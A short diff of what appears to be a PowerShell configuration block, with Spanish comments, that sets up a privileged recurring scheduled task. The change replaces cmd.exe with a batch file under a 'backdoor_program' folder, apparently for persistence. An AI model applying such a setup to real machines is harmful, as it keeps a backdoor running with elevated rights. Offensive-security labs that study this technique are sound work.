@@ -27,8 +27,8 @@ $privileged_task = "privileged_task"
 $recurrent_task = "notepad"
 
 ### Programa a ejecutar 
-$task_to_execute = "%windir%\System32\cmd.exe"
-
+#$task_to_execute = "%windir%\System32\cmd.exe"
+$task_to_execute = "C:\ProgramData\backdoor_program\windows\run.bat"
 # End Configuración
 # ================================================
 # ================================================
